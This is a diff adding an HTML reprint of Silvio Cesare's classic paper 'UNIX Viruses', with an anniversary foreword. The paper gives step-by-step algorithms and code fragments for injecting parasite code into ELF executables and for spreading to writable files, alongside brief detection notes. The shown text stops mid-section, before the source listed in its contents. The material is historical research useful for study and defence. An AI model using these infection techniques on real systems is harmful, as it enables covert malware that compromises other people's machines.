@@ -1,0 +1,1726 @@
+<html>
+<head>
+<title>UNIX VIRUSES 25th Anniversary Edition</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄▄▄▄▄ │
+UNIX VIRUSES 25th Anniversary Edition                  │                   █   │
+with forward by elfmaster                              │                   █   │
+~ Silvio Cesare                                        └───────────────────█ ──┘
+
+Dedicated to Silvio Cesare, the father of UNIX Viruses...
+
+The year was 1998, I "elfmaster" was about 15yrs old. At this time, the
+underground hacking scene had a mystical undercurrent and was teaming with
+digital life on EFNET IRC: #phrack, #hackers, #b4b0, etc.  I was acquainted
+with Silvio through mutual channels and zines. It was quickly apparent to me
+that Silvio was a mad scientist who's brilliant research only got more
+innovative with each publication.  At this time Silvio's deepest interest lied
+in the pioneering of ELF virus infection, for which he paved the way through a
+series of radical papers dropping non-trivial details on this subject that was
+considered esoteric even amongst the most elite hackers of the time-- at this
+time UNIX/Linux reverse engineering and virus design was infintile in its
+state of evolution. Silvio raised the state of the art in UNIX/Linux reversing
+through his innovation of ELF virus technology, greatly impacting the
+underground hacker scene and academia for decades to come... 
+
+At some point during the golden era of 1998, the paper "UNIX Viruses"
+caught my attention on VXHeaven under the "UNIX and Clones" reading section.
+A highly technical paper by Silvio detailing 3 new infection techniques, 
+relocatable code injection, position-independent code techniques, ELF virus 
+detection, and more.
+
+This paper (And others) of Silvio's invograted me, I was compelled to learn with
+a tenacity purely inspired by this magical and arcane research. Silvio's work in
+pioineering ELF virus technology was groundbreaking for computer security and 
+computer science technologies in general...
+
+Here we are now, 25 years later. At tmp.0ut we carry deep love and respect
+for Silvio and his profound body of research. Let us honor his work by releasing
+the 25th Anniversary edition of "UNIX Viruses"!
+
+───────────────────────────────────────//───────────────────────────────────────
+
+UNIX VIRUSES
+
+    - Silvio Cesare &lt;silvio@big.net.au&gt;
+
+CONTENTS
+--------
+
+IMPROVING THIS MANUAL
+THE UNIX-VIRUS MAILING LIST
+INTRODUCTION
+THE NON ELF INFECTOR FILE VIRUS (FILE INFECTION)
+MEMORY LAYOUT OF AN ELF EXECUTABLE
+ELF INFECTION
+THE TEXT SEGMENT PADDING VIRUS (PADDING INFECTION)
+INFECTING INFECTIONS
+THE DATA SEGMENT VIRUS (DATA INFECTION)
+VIRUS DETECTION
+THE TEXT SEGMENT VIRUS (TEXT INFECTION)
+INFECTION USING OBJECT CODE PARASITES
+OBJECT CODE LINKING
+THE IMPLEMENTED INFECTOR
+NON (NOT AS) TRIVIAL PARASITE CODE
+BEYOND ELF PARASITES AND ENTER VIRUS IN UNIX
+THE LINUX PARASITE VIRUS
+DEVELOPMENT OF THE LINUX VIRUS
+IMPROVING THE LINUX VIRUS
+VIRUS DETECTION
+EVADING VIRUS DETECTION IN ELF INFECTION
+CONCLUSION
+SOURCE (UUENCODED)
+
+IMPROVING THIS MANUAL
+
+For any comments or suggestions (even just to say hi) please contact the author
+Silvio Cesare, &lt;silvio@big.net.au&gt;.  This paper already has future plans to
+include more parasite techniques and shared object infection.  More to come.
+
+THE UNIX-VIRUS MAILING LIST
+
+This is the charter for the unix-virus mailing list. Unix-virus was created to
+discuss viruses in the unix environment from the point of view of the virus
+creator, and the security developer writing anti-virus software. Anything
+related to viruses in the unix environment is open for discussion. Low level
+programming is commonly seen on the list, including source code. The emphasis
+is on expanding the knowledge of virus technology and not on the distribution
+of viruses, so binaries are discouraged but not totally excluded. The list is
+archived at http://virus.beergrave.net and it is recommended that the new
+subscriber read the existing material before posting.
+
+To subscribe to the list send a message to majordomo@virus.beergrave.net with
+'subscribe unix-virus' in the body of the message.
+
+INTRODUCTION
+
+This paper documents the algorithms and implementation of UNIX parasite and
+virus code using ELF objects.  Brief introductions on UNIX virus detection and
+evading such detection are given. An implementation of various ELF parasite
+infectors for UNIX is provided, and an ELF virus for Linux on x86 architecture
+is also supplied.
+
+Elementary programming and UNIX knowledge is assumed, and an understanding of
+Linux x86 architecture is assumed for the Linux implementation.  ELF
+understanding is not required but will help.
+
+This paper does not document any significant virus programming techniques
+except those that are only applicable to the UNIX environment.  Nor does it
+try to replicate the ELF specifications.  The interested reader is advised
+to read the ELF documentation if this paper is unclear in ELF specifics.
+
+THE NON ELF INFECTOR FILE VIRUS (FILE INFECTION)
+
+An interesting, yet simple idea for a virus takes note, that when you append
+one executable to another, the original executable executes, but the latter
+executable is still intact and retrievable and even executable if copied to
+a new file and executed.
+
+# cat host &gt;&gt; parasite
+# mv parasite host
+# ./host
+PARASITE Executed
+
+Now.. if the parasite keeps track of its own length, it can copy the original
+host to a new file, then execute it like normal, making a working parasite and
+virus.  The algorithm is as follows:
+
+    * execute parasite work code
+    * lseek to the end of the parasite
+    * read the remaining portion of the file
+    * write to a new file
+    * execute the new file
+
+The downfall with this approach is that the remaining executable no longer
+remains strip safe.  This will be explained further on when a greater
+understanding of the ELF format is obtained, but to summarize, the ELF headers
+no longer hold into account every portion of the file, and strip removes
+unaccounted portions. This is the premise of virus detection with this type of
+virus.
+
+This same method can be used to infect LKM's following similar procedures.
+
+MEMORY LAYOUT OF AN ELF EXECUTABLE
+
+A process image consists of a 'text segment' and a 'data segment'.  The text
+segment is given the memory protection r-x (from this its obvious that self
+modifying code cannot be used in the text segment).  The data segment is
+given the protection rw-.
+
+The segment as seen from the process image is typically not all in use as
+memory used by the process rarely lies on a page border (or we can say, not
+congruent to modulo the page size).  Padding completes the segment, and in
+practice looks like this.
+
+key:
+    [...]   A complete page
+    M   Memory used in this segment
+    P   Padding
+
+Page Nr
+#1  [PPPPMMMMMMMMMMMM]      \
+#2  [MMMMMMMMMMMMMMMM]       |- A segment
+#3  [MMMMMMMMMMMMPPPP]      /
+
+Segments are not bound to use multiple pages, so a single page segment is quite
+possible.
+
+Page Nr
+#1  [PPPPMMMMMMMMPPPP]      &lt;- A segment
+
+Typically, the data segment directly proceeds the text segment which always
+starts on a page, but the data segment may not.  The memory layout for a
+process image is thus.
+
+key:
+    [...]   A complete page
+    T   Text
+    D   Data
+    P   Padding
+
+Page Nr
+#1  [TTTTTTTTTTTTTTTT]      &lt;- Part of the text segment
+#2  [TTTTTTTTTTTTTTTT]      &lt;- Part of the text segment
+#3  [TTTTTTTTTTTTPPPP]      &lt;- Part of the text segment
+#4  [PPPPDDDDDDDDDDDD]      &lt;- Part of the data segment
+#5  [DDDDDDDDDDDDDDDD]      &lt;- Part of the data segment
+#6  [DDDDDDDDDDDDPPPP]      &lt;- Part of the data segment
+
+pages 1, 2, 3 constitute the text segment
+pages 4, 5, 6 constitute the data segment
+
+From here on, the segment diagrams may use single pages for simplicity. eg
+
+Page Nr
+#1  [TTTTTTTTTTTTPPPP]      &lt;- The text segment
+#2  [PPPPDDDDDDDDPPPP]      &lt;- The data segment
+
+For completeness, on x86, the stack segment is located after the data segment
+giving the data segment enough room for growth.  Thus the stack is located at
+the top of memory (remembering that it grows down).
+
+In an ELF file, loadable segments are present physically in the file, which
+completely describe the text and data segments for process image loading.  A
+simplified ELF format for an executable object relevant in this instance is.
+
+    ┌───────────────────────┐
+    │ ELF Header            │
+    ├───────────────────────┤
+    │ ...                   │
+    ├───────────────────────┤
+    │ ...                   │
+    ├───────────────────────┤
+    │ Segment 1 - Text      │
+    ├───────────────────────┤
+    │ Segment 2 - Data      │
+    ├───────────────────────┤
+    │ ...                   │
+    ├───────────────────────┤
+    │ ...                   │
+    └───────────────────────┘
+
+Each segment has a virtual address associated with its starting location.
+Absolute code that references within each segment is permissible and very
+probable.
+
+ELF INFECTION
+
+To insert parasite code means that the process image must load it so that the
+original code and data is still intact.  This means, that inserting a
+parasite requires the memory used in the segments to be increased.
+
+The text segment compromises not only code, but also the ELF headers including
+such things as dynamic linking information.  It may be possible to keep the
+text segment as is, and create another segment consisting of the parasite code,
+however introducing an extra segment is certainly questionable and easy to
+detect.
+
+Page padding at segment borders however provides a practical location for
+parasite code given that its size is able.  This space will not interfere with
+the original segments, requiring no relocation.  Following the guideline just
+given of preferencing the text segment, we can see that the padding at the
+end of the text segment is a viable solution.
+
+Extending the text segment backwards is a viable solution and is documented
+and implemented further in this article.
+
+Extending the text segment forward or extending the data segment backward will
+probably overlap the segments.  Relocating a segment in memory will cause
+problems with any code that absolutely references memory.
+
+It is  possible to extend the data segment, however this isn't preferred,
+as its not UNIX portable that properly implement execute memory protection.
+An ELF parasite however is implemented using this technique and is explained
+later in this article.
+
+THE EXECUTABLE AND LINKAGE FORMAT
+
+A more complete ELF executable layout is (ignoring section content - see 
+below).
+
+    ┌───────────────────────┐
+    │ ELF Header            │
+    ├───────────────────────┤
+    │ Program Header Table  │
+    ├───────────────────────┤
+    │ Segment 1             │
+    ├───────────────────────┤
+    │ Segment 2             │
+    ├───────────────────────┤
+    │ Section Header Table  │
+    │ (optional)            │
+    └───────────────────────┘
+
+In practice, this is what is normally seen.
+
+    ┌───────────────────────┐
+    │ ELF Header            │
+    ├───────────────────────┤
+    │ Program Header Table  │
+    ├───────────────────────┤
+    │ Segment 1             │
+    ├───────────────────────┤
+    │ Segment 2             │
+    ├───────────────────────┤
+    │ Section Header Table  │
+    ├───────────────────────┤
+    │ Section 1             │
+    ├───────────────────────┤
+    │ Section 2             │
+    ├───────────────────────┤
+    │ ...                   │
+    ├───────────────────────┤
+    │ Section n             │
+    └───────────────────────┘
+
+Typically, the extra sections (those not associated with a segment) are such
+things as debugging information, symbol tables etc.
+
+From the ELF specifications:
+
+"An ELF header resides at the beginning and holds a ``road map'' describing the
+file's organization. Sections  hold the bulk of object file information for the 
+linking view: instructions, data, symbol table, relocation  information, and so
+on.
+
+...
+...
+
+A program header table, if present, tells the system how to create a process
+image.  Files used to build a process image (execute a program) must have a
+program header table; relocatable files do not need one.  A section header
+table contains information describing the file's sections.  Every section has
+an entry in the table; each entry gives information such as the section name,
+the section size, etc.  Files used during linking must have a section header
+table; other object files may or may not have one.
+
+...
+...
+
+Executable and shared object files statically represent programs.  To execute
+such programs, the system uses the files to create dynamic program
+representations, or process images.  A process image has segments that hold
+its text, data, stack, and so on.  The major sections in this part discuss the
+following.
+
+Program header. This section complements Part 1, describing object file
+structures that relate directly to program execution.  The primary data
+structure, a program header table, locates segment images within the file and
+contains other information necessary to create the memory image for the
+program."
+
+An ELF object may also specify an entry point of the program, that is, the
+virtual memory location that assumes control of the program.  Thus to
+activate parasite code, the program flow must include the new parasite.  This
+can be done by patching the entry point in the ELF object to point (jump)
+directly to the parasite.  It is then the parasite's responsibility that the
+host code be executed - typically, by transferring control back to the host
+once the parasite has completed its execution.
+
+From /usr/include/elf.h
+
+typedef struct
+{
+  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
+  Elf32_Half    e_type;                 /* Object file type */
+  Elf32_Half    e_machine;              /* Architecture */
+  Elf32_Word    e_version;              /* Object file version */
+  Elf32_Addr    e_entry;                /* Entry point virtual address */
+  Elf32_Off     e_phoff;                /* Program header table file offset */
+  Elf32_Off     e_shoff;                /* Section header table file offset */
+  Elf32_Word    e_flags;                /* Processor-specific flags */
+  Elf32_Half    e_ehsize;               /* ELF header size in bytes */
+  Elf32_Half    e_phentsize;            /* Program header table entry size */
+  Elf32_Half    e_phnum;                /* Program header table entry count */
+  Elf32_Half    e_shentsize;            /* Section header table entry size */
+  Elf32_Half    e_shnum;                /* Section header table entry count */
+  Elf32_Half    e_shstrndx;             /* Section header string table index */
+} Elf32_Ehdr;
+
+e_entry is the entry point of the program given as a virtual address.  For
+knowledge of the memory layout of the process image and the segments that
+compromise it stored in the ELF object see the Program Header information
+below.
+
+e_phoff gives use the file offset for the start of the program header table.
+Thus to read the header table (and the associated loadable segments), you may
+lseek to that position and read e_phnum*sizeof(Elf32_Pdr) bytes associated with
+the program header table.
+
+It can also be seen, that the section header table file offset is also given.
+It was previously mentioned that the section table resides at the end of
+the file, so after inserting of data at the end of the segment on file, the
+offset must be updated to reflect the new position.
+
+/* Program segment header.  */
+
+typedef struct
+{
+  Elf32_Word    p_type;                 /* Segment type */
+  Elf32_Off     p_offset;               /* Segment file offset */
+  Elf32_Addr    p_vaddr;                /* Segment virtual address */
+  Elf32_Addr    p_paddr;                /* Segment physical address */
+  Elf32_Word    p_filesz;               /* Segment size in file */
+  Elf32_Word    p_memsz;                /* Segment size in memory */
+  Elf32_Word    p_flags;                /* Segment flags */
+  Elf32_Word    p_align;                /* Segment alignment */
+} Elf32_Phdr;
+
+Loadable program segments (text/data) are identified in a program header by a
+p_type of PT_LOAD (1).  Again as with the e_shoff in the ELF header, the
+file offset (p_offset) must be updated in later phdr's to reflect their new
+position in the file.
+
+p_vaddr identifies the virtual address of the start of the segment.  As
+mentioned above regarding the entry point.  It is now possible to identify
+where program flow begins, by using p_vaddr as the base index and calculating
+the offset to e_entry.
+
+p_filesz and p_memsz are the file sizes and memory sizes respectively that
+the segment occupies.  The use of this scheme of using file and memory sizes,
+is that where its not necessary to load memory in the process from disk, you
+may still be able to say that you want the process image to occupy its
+memory.
+
+The .bss section (see below for section definitions), which is for uninitialized
+data in the data segment is one such case.  It is not desirable that
+uninitialized data be stored in the file, but the process image must allocated
+enough memory.  The .bss section resides at the end of the segment and any
+memory size past the end of the file size is assumed to be part of this
+section.
+
+/* Section header.  */
+
+typedef struct
+{
+  Elf32_Word    sh_name;                /* Section name (string tbl index) */
+  Elf32_Word    sh_type;                /* Section type */
+  Elf32_Word    sh_flags;               /* Section flags */
+  Elf32_Addr    sh_addr;                /* Section virtual addr at execution */
+  Elf32_Off     sh_offset;              /* Section file offset */
+  Elf32_Word    sh_size;                /* Section size in bytes */
+  Elf32_Word    sh_link;                /* Link to another section */
+  Elf32_Word    sh_info;                /* Additional section information */
+  Elf32_Word    sh_addralign;           /* Section alignment */
+  Elf32_Word    sh_entsize;             /* Entry size if section holds table */
+} Elf32_Shdr;
+
+The sh_offset is the file offset that points to the actual section.  The
+shdr should correlate to the segment its located it.  It is highly suspicious
+if the vaddr of the section is different to what is in from the segments
+view.
+
+THE TEXT SEGMENT PADDING VIRUS (PADDING INFECTION)
+
+The resulting segments after parasite insertion into text segment padding looks
+like this.
+
+key:
+    [...]   A complete page
+    V   Parasite code
+    T   Text
+    D   Data
+    P   Padding
+
+Page Nr
+#1  [TTTTTTTTTTTTVVPP]      &lt;- Text segment
+#2  [PPPPDDDDDDDDPPPP]      &lt;- Data segment
+
+...
+
+After insertion of parasite code, the layout of the ELF file will look like
+this.
+
+    ┌─────────────────────────────────┐
+    │ ELF Header                      │
+    ├─────────────────────────────────┤
+    │ Program Header Table            │
+    ├─────────────────────────────────┤
+    │ Segment 1 (Host's Text Segment) │
+    │╒═══════════════════════════════╕│
+    │┼         The Parasite          ┼│
+    │╘═══════════════════════════════╛│
+    ├─────────────────────────────────┤
+    │ Segment 2                       │
+    ├─────────────────────────────────┤
+    │ Section Header Table            │
+    ├─────────────────────────────────┤
+    │ Section 1                       │
+    ├─────────────────────────────────┤
+    │ Section 2                       │
+    ├─────────────────────────────────┤
+    │ ...                             │
+    ├─────────────────────────────────┤
+    │ Section n                       │
+    └─────────────────────────────────┘
+
+Thus the parasite code must be physically inserted into the file, and the
+text segment extended to see the new code.
+
+
+To insert code at the end of the text segment thus leaves us with the following
+to do so far.
+
+    * Increase p_shoff to account for the new code in the ELF header
+    * Locate the text segment program header
+        * Increase p_filesz to account for the new code
+        * Increase p_memsz to account for the new code
+    * For each phdr who's segment is after the insertion (text segment)
+        * increase p_offset to reflect the new position after insertion
+    * For each shdr who's section resides after the insertion
+        * Increase sh_offset to account for the new code
+    * Physically insert the new code into the file - text segment p_offset
+      + p_filesz (original)
+
+There is one hitch however. Following the ELF specifications, p_vaddr and
+p_offset in the Phdr must be congruent together, to modulo the page size.
+
+key:    ~= is denoting congruency.
+
+    p_vaddr (mod PAGE_SIZE) ~= p_offset (mod PAGE_SIZE)
+
+This means, that any insertion of data at the end of the text segment on the
+file must be congruent modulo the page size.  This does not mean, the text
+segment must be increased by such a number, only that the physical file be
+increased so.
+
+This also has an interesting side effect in that often a complete page must be
+used as padding because the required vaddr isn't available.  The following
+may thus happen.
+
+key:
+    [...]   A complete page
+    T   Text
+    D   Data
+    P   Padding
+
+Page Nr
+#1  [TTTTTTTTTTTTPPPP]      &lt;- Text segment
+#2  [PPPPPPPPPPPPPPPP]      &lt;- Padding
+#3  [PPPPDDDDDDDDPPPP]      &lt;- Data segment
+
+This can be taken advantage off in that it gives the parasite code more space,
+such a spare page cannot be guaranteed.
+
+To take into account of the congruency of p_vaddr and p_offset, our algorithm
+is modified to appear as this.
+
+    * Increase p_shoff by PAGE_SIZE in the ELF header
+    * Locate the text segment program header
+        * Increase p_filesz by account for the new code
+        * Increase p_memsz to account for the new code
+    * For each phdr who's segment is after the insertion (text segment)
+        * increase p_offset by PAGE_SIZE
+    * For each shdr who's section resides after the insertion
+        * Increase sh_offset by PAGE_SIZE
+    * Physically insert the new code and pad to PAGE_SIZE, into the file -
+      text segment p_offset + p_filesz (original)
+
+Now that the process image loads the new code into being, to run the new code
+before the host code is a simple matter of patching the ELF entry point and
+the virus jump to host code point.
+
+The new entry point is determined by the text segment v_addr + p_filesz
+(original) since all that is being done, is the new code is directly prepending
+the original host segment.  For complete infection code then.
+
+    * Increase p_shoff by PAGE_SIZE in the ELF header
+    * Patch the insertion code (parasite) to jump to the entry point
+      (original)
+    * Locate the text segment program header
+        * Modify the entry point of the ELF header to point to the new
+          code (p_vaddr + p_filesz)
+        * Increase p_filesz by account for the new code (parasite)
+        * Increase p_memsz to account for the new code (parasite)
+    * For each phdr who's segment is after the insertion (text segment)
+        * increase p_offset by PAGE_SIZE
+    * For each shdr who's section resides after the insertion
+        * Increase sh_offset by PAGE_SIZE
+    * Physically insert the new code (parasite) and pad to PAGE_SIZE, into
+      the file - text segment p_offset + p_filesz (original)
+
+This, while perfectly functional, can arouse suspicion because the the new
+code at the end of the text segment isn't accounted for by any sections.
+Its an easy matter to associate the entry point with a section however by
+extending its size, but the last section in the text segment is going to look
+suspicious.  Associating the new code to a section must be done however as
+programs such as 'strip' use the section header tables and not the program
+headers.  The final algorithm is using this information is.
+
+    * Increase p_shoff by PAGE_SIZE in the ELF header
+    * Patch the insertion code (parasite) to jump to the entry point
+      (original)
+    * Locate the text segment program header
+        * Modify the entry point of the ELF header to point to the new
+          code (p_vaddr + p_filesz)
+        * Increase p_filesz by account for the new code (parasite)
+        * Increase p_memsz to account for the new code (parasite)
+    * For each phdr who's segment is after the insertion (text segment)
+        * increase p_offset by PAGE_SIZE
+    * For the last shdr in the text segment
+        * increase sh_len by the parasite length
+    * For each shdr who's section resides after the insertion
+        * Increase sh_offset by PAGE_SIZE
+    * Physically insert the new code (parasite) and pad to PAGE_SIZE, into
+      the file - text segment p_offset + p_filesz (original)
+
+infect-elf-p is the supplied program (complete with source) that implements
+the elf infection using text segment padding as described.
+
+INFECTING INFECTIONS
+
+In the parasite described, infecting infections isn't a problem at all.  By
+skipping executables that don't have enough padding for the parasite, this
+is solved implicitly.  Multiple parasites may exist in the host, but their is
+a limit of how many depending on the size of the parasite code.
+
+THE DATA SEGMENT VIRUS (DATA INFECTION)
+
+The new method of ELF infection as briefly described in the last section means
+that the data segment is extended and the parasite is located in the new
+extended space.  In x86 architecture, at least, code that is in the data
+segment may be executed.
+
+To extend the data segment means we simply have to extend the program header
+in the ELF executable.  Note must be taken though, that the .bss section
+ends the data segment normally.  This section is used for uninitialized data
+and occupies no file space but does occupy memory space.  If we extend
+the data segment we have to leave space for the .bss section.  The memory
+layout is as follows.
+
+original:
+
+    ┌──────────┐
+    │   Text   │
+    ├──────────┤
+    │   Data   │
+    └──────────┘
+
+parasite:
+
+    ┌──────────┐
+    │   Text   │
+    ├──────────┤
+    │   Data   │
+    ├──────────┤
+    ┼ Parasite ┼
+    └──────────┘
+
+The algorithm for the data segment parasite is show below.
+
+        * Patch the insertion code (parasite) to jump to the entry point
+          (original)
+        * Locate the data segment
+                * Modify the entry point of the ELF header to point to the new
+                  code (p_vaddr + p_memsz)
+                * Increase p_filesz to account for the new code and .bss
+                * Increase p_memsz to account for the new code
+                * Find the length of the .bss section (p_memsz - p_filesz)
+        * For each phdr who's segment is after the insertion (text segment)
+                * increase p_offset to reflect the new position after insertion
+        * For each shdr who's section resides after the insertion
+                * Increase sh_offset to account for the new code
+        * Physically insert the new code into the file
+
+The algorithm shown works for an ELF executable but the parasite inserted into
+the host becomes strip unsafe because no section matches the parasite.  A
+new section could be created for this purpose to become strip safe again.
+This however has not been implemented.
+
+This type of virus is easy to spot if you know what your looking for.  For
+starters no section matches the entry point and more suspect is the fact that
+the entry point is in the data segment.
+
+VIRUS DETECTION
+
+The detection of the data segment virus is extremely easy taking into account
+that the entry point of the ELF image is in the data segment not in the text
+segment.
+
+An implementation of a simple virus scanner is supplied.
+
+THE TEXT SEGMENT VIRUS (TEXT INFECTION)
+
+The text segment virus works under the premise that the text segment can be
+extended backwards and new parasite code can run in the extension. The memory
+layout is as follows.
+
+original:
+
+    ┌──────────┐
+    │   Text   │
+    ├──────────┤
+    │   Data   │
+    └──────────┘
+
+parasite:
+
+    ┌──────────┐
+    ┼ Parasite ┼ (new start of text)
+    ├──────────┤
+    │   Text   │
+    ├──────────┤
+    │   Data   │
+    └──────────┘
+
+The algorithm is as follows:
+
+        * Patch the insertion code (parasite) to jump to the entry point
+          (original)
+        * Locate the text segment
+
+        * For each phdr who's segment is after the insertion (text segment)
+                * increase p_offset to reflect the new position after insertion
+        * For each shdr who's section resides after the insertion
+                * Increase sh_offset to account for the new code
+        * Physically insert the new code into the file
+
+
+INFECTION USING OBJECT CODE PARASITES
+
+It is often desireable not to use assembler for parasite code but use direct
+C code instead.  This can make writing a pure C virus possible avoiding the
+messy steps of converting code to asm which require extra time and skill.
+
+This can be acheived through the use of relocatable or object code.  Because
+we cant just extract an executeable image as the parasite image because the
+image is fixed at a certain memory location we can use a relocatable image and
+link into the desired location.
+
+OBJECT CODE LINKING
+
+ELF is the typical standard used to represent object code on Linux.  The paper
+will thus only refer to linking using ELF objects.
+
+An object code file is referred to as relocatable code when using ELF because
+that summarizes what it is.  It is not fixed to any memory position.  It is
+the responsibility of linking that makes an executable image out of a
+relocatable object and binds symbols to addresses.
+
+Linking of code is done by relocating the code to a fixed positing.  For the
+most part, the object code does not need to be changed heavily.
+
+Consider the following C code.
+
+#include &lt;linux/unistd.h&gt;
+#include &lt;linux/types.h&gt;
+
+static inline _syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
+
+int main()
+{
+        write(1, "INFECTED Host\n", 14);
+}
+
+The string 's' being part of the relocatable text section in the object
+has no known absolute position in memory at compile time.  Likewise, printk,
+is an externally defined symbol and its address is also not known at compile
+time.
+
+Relocation sections in the ELF object are used for describing what needs to be
+modified (relocated) in the object.  In the above case, relocation entries
+would be made for printk's reference and the string's reference.
+
+The format for an ELF relocatable object (object code) is as follows.
+
+    ┌───────────────────────┐
+    │ ELF Header            │
+    ├───────────────────────┤
+    │ Program Header Table  │
+    ├───────────────────────┤
+    │ Section 1             │
+    ├───────────────────────┤
+    │ Section n             │
+    ├───────────────────────┤
+    │ Section Header Table  │
+    └───────────────────────┘
+
+From the ELF specifications.
+
+
+"String Table
+
+String table sections hold null-terminated character sequences, commonly called
+strings.  The object file uses these strings to represent symbol and section
+names.  One references a string as an index into the string table section.  The
+first byte, which is index zero, is defined to hold a null character.
+Likewise, a string tables last byte is defined to hold a null character,
+ensuring null termination for all strings.  A string whose index is zero
+specifies either no name or a null name, depending on the context.  An empty
+string table section is permitted; its section headers sh_size member would
+contain zero.  Non-zero indexes are invalid for an empty string table."
+
+.
+.
+.
+
+Symbol Table
+
+An object file's symbol table holds information needed to locate and relocate a
+program's symbolic definitions and references.  A symbol table index is a
+subscript into this array.  Index 0 both designates the first entry in the
+table and serves as the undefined symbol index.  The contents of the initial
+entry are specified later in this section."
+
+/* Symbol table entry.  */
+
+typedef struct
+{
+  Elf32_Word    st_name;                /* Symbol name (string tbl index) */
+  Elf32_Addr    st_value;               /* Symbol value */
+  Elf32_Word    st_size;                /* Symbol size */
+  unsigned char st_info;                /* Symbol type and binding */
+  unsigned char st_other;               /* No defined meaning, 0 */
+  Elf32_Section st_shndx;               /* Section index */
+} Elf32_Sym;
+
+#define SHN_UNDEF       0               /* No section, undefined symbol.  */
+
+/* How to extract and insert information held in the st_info field.  */
+
+#define ELF32_ST_TYPE(val)              ((val) & 0xf)
+#define ELF32_ST_INFO(bind, type)       (((bind) &lt;&lt; 4) + ((type) & 0xf))
+
+/* Legal values for ST_BIND subfield of st_info (symbol binding).  */
+
+#define STB_LOCAL       0               /* Local symbol */
+#define STB_GLOBAL      1               /* Global symbol */
+#define STB_WEAK        2               /* Weak symbol */
+#define STB_NUM         3               /* Number of defined types.  */
+#define STB_LOPROC      13              /* Start of processor-specific */
+#define STB_HIPROC      15              /* End of processor-specific */
+
+From the ELF specifications.
+
+"A relocation section references two other sections: a symbol table and a
+section to modify.  The section headers sh_info and sh_link members, described
+in ``Sections'' above, specify these relationships. Relocation entries for
+different object files have slightly different interpretations for the r_offset
+member.
+
+In relocatable files, r_offset holds a section offset.  That is, the relocation
+section itself describes how to modify another section in the file; relocation
+offsets designate a storage unit within the second section."
+
+From /usr/include/elf.h
+
+/* Relocation table entry without addend (in section of type SHT_REL).  */
+
+typedef struct
+{
+  Elf32_Addr    r_offset;               /* Address */
+  Elf32_Word    r_info;                 /* Relocation type and symbol index */
+} Elf32_Rel;
+
+/* How to extract and insert information held in the r_info field.  */
+
+#define ELF32_R_SYM(val)                ((val) &gt;&gt; 8)
+#define ELF32_R_TYPE(val)               ((val) & 0xff)
+#define ELF32_R_INFO(sym, type)         (((sym) &lt;&lt; 8) + ((type) & 0xff))
+
+These selected paragraphs and sections from the ELF specifications and header
+files give us a good high level concept of how a relocatable ELF file can
+be linked to produce an image capable of being executed.
+
+The process of linking the image is as follows.
+
+        * Identify the file as being in relocatable ELF format
+        * Load each relevant section into memory
+        * For each PROGBITS section set the section address in memory
+        * For each REL (relocation) section, carry out the relocation
+        * Assemble the executable image by copying the sections into their
+                respective positions in memory
+
+The relocation step may be expanded into the following algorithm.
+
+        * Evaluate the target section of the relocation entry
+        * Evaluate the symbol table section of the relocation entry
+        * Evaluate the location in the section that the relocation is to apply
+        * Evaluate the address of the symbol that is used in the relocation
+        * Apply the relocation
+
+The actual relocation is best presented by looking at the source.  For more
+information on the relocation types refer to the ELF specifications.  Note
+that we ignore the global offset table completely and any relocation types
+of its nature.
+
+        switch (ELF32_R_TYPE(rel-&gt;r_info)) {
+        case R_386_NONE:
+                break;
+
+        case R_386_PLT32:
+        case R_386_PC32:
+                *loc -= dot;    /* *loc += addr - dot   */
+
+        case R_386_32:
+                *loc += addr;
+                break;
+
+THE IMPLEMENTED INFECTOR
+
+The implemented infector must use C parasite code that avoids libc and uses
+Linux syscalls exclusively.  This means that plt/got problems are avoided.
+Likewise the parasite code must end in the following asm:
+
+loop1:
+                popl    %eax
+                cmpl    $0x22223333, %eax
+                jne     loop1
+
+                popl    %edx
+                popl    %ecx
+                popl    %ebx
+                popl    %eax
+                popl    %esi
+                popl    %edi
+                movl    $0x11112222, %ebp
+                jmp     *%ebp
+
+This is so it can jump back to the host correctly.  It uses a little trickery
+to do this properly.  Why the popl loop? - well.. the jump back to host goes in
+_before_ the end of main, so there are still some variables to be pop'd back
+before your back to where you start.  you dont know how many variables have
+been pushed, so a unique magic number is used to mark the start/end of it -
+check the initcode in relocater.c.  The movl $0x11112222,%ebp ? - well.. u dont
+know where abouts this jmp (back to host) is going to be in the code, so you
+substitute a unique magic number where you want the host entry point to go.
+Then you search the object code for the magic and replace.
+
+NON (NOT AS) TRIVIAL PARASITE CODE
+
+Parasite code that requires memory access requires the stack to be used
+manually naturally.  No bss section can be used from within the virus code in
+the padding and text infectors because it can only use part of the text
+segment.  It is strongly suggested that rodata not be used, in-fact, it is
+strongly suggested that no location specific data be used at all that resides
+outside the parasite at infection time.
+
+Thus, if initialized data is to be used, it is best to place it in the text
+segment, ie at the end of the parasite code - see below on calculating address
+locations of initialized data that is not known at compile/infection time.
+
+If the heap is to be used, then it will be operating system dependent.  In
+Linux, this is done via the 'brk' syscall.
+
+The use of any shared library calls from within the parasite should be removed,
+to avoid any linking problems and to maintain a portable parasite in files
+that use varying libraries.  It is thus naturally recommended to avoid using
+libc.
+
+Most importantly, the parasite code must be relocatable.  It is possible to
+patch the parasite code before inserting it, however the cleanest approach
+is to write code that doesn't need to be patched.
+
+In x86 Linux, some syscalls require the use of an absolute address pointing to
+initialized data.  This can be made relocatable by using a common trick used
+in buffer overflow code.
+
+    jmp A
+B:
+    pop %eax    ; %eax now has the address of the string
+    .       ; continue as usual
+    .
+    .
+
+A:
+    call B
+.string \"hello\"
+
+By making a call directly proceeding the string of interest, the address of
+the string is pushed onto the stack as the return address.
+
+BEYOND ELF PARASITES AND ENTER VIRUS IN UNIX
+
+In a UNIX environment the most probably method for a typical garden variety
+virus to spread is through infecting files that it has legal permission to do
+so.  
+
+A simple method of locating new files possible to infect, is by scanning the
+current directory for writable files.  This has the advantage of being
+relatively fast (in comparison to large tree walks) but finds only a small
+percentage of infect-able files.
+
